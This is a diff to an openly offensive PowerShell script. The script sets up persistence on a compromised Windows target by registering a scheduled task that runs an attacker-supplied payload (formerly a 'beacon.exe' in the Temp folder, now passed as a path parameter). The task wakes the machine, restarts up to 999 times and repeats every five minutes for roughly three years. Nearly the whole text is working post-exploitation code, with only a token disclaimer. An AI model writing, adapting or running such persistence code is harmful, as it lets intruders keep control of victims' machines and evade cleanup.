@@ -1,11 +1,14 @@
 ##POWERSHELL SCRIPT TO SET-UP PERSISTENCE ON A TARGET AFTER THE INITIAL HIT.
 ##DO NOT USE FOR ILLEGAL PURPOSES
 
+param( [Parameter(Mandatory=$true)] $Path)
+
+echo ""
 echo "[+]Creating Task..."
 
 #action
 $taskAction = New-ScheduledTaskAction `
-    -Execute 'C:\Windows\Temp\beacon.exe' #EDIT USING YOUR OWN SHELLCODE PATH ON TARGET
+    -Execute $Path
 
 #triggering
 $trigger = New-ScheduledTaskTrigger `
@@ -19,8 +22,8 @@ $settings = New-ScheduledTaskSettingsSet `
     -StartWhenAvailable `
     -RunOnlyIfNetworkAvailable `
     -WakeToRun `
-    -RestartCount 999 ` #TIMES TO RESTART THE TASK IF IT FAILS 
-    -RestartInterval (New-TimeSpan -Minutes 1) 
+    -RestartCount 999 `
+    -RestartInterval (New-TimeSpan -Minutes 1)
 
 #creation
 $task = Register-ScheduledTask `
@@ -34,5 +37,3 @@ $task = Register-ScheduledTask `
 $task.Triggers.Repetition.Duration = "P1075D" #TASK LIFESPAN
 $task.Triggers.Repetition.Interval = "PT5M" #TASK REPEATING INTERVAL
 $task | Set-ScheduledTask
-
-echo "[+] Task Created!"
